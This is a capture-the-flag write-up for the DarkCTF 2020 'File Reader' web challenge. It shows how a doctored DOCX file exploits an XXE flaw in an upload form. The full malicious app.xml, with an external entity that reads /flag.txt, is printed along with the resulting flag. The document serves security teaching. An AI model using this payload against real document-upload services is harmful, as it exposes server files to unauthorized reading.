# DarkCTF 2020 – File Reader

* **Category:** web
* **Points:** 494?

## Challenge

> My friend developed this website but he says user should know some Xtreme > Manipulative Language to understand this web.
> 
> Flag is in /flag.txt
> 
> http://filereader.darkarmy.xyz/

## Solution

The web site is a form to upload files. Reading the challenge description, an *XXE* should be involved.

The form allows only PDF and DOCX files.

Uploading a DOCX file, you can notice that some information are shown. One of them is the number of pages.

DOCX files are archives of files where XML documents are present.

It is sufficient to create a DOCX and to alter the [`test.docx\docProps\app.xml`](app.xml) file, where the number of pages is stored, like the following.

```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///flag.txt" >]>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties" xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes"><Template>Normal.dotm</Template><TotalTime>0</TotalTime><Pages>&xxe;</Pages><Words>0</Words><Characters>4</Characters><Application>Microsoft Office Word</Application><DocSecurity>0</DocSecurity><Lines>1</Lines><Paragraphs>1</Paragraphs><ScaleCrop>false</ScaleCrop><Company>Reply</Company><LinksUpToDate>false</LinksUpToDate><CharactersWithSpaces>4</CharactersWithSpaces><SharedDoc>false</SharedDoc><HyperlinksChanged>false</HyperlinksChanged><AppVersion>16.0000</AppVersion></Properties>
```

Uploading the file in the web application will return the flag where the number of pages is shown. The flag will be the following.

```
darkCTF{1nj3ct1ng_d0cx_f0r_xx3}
```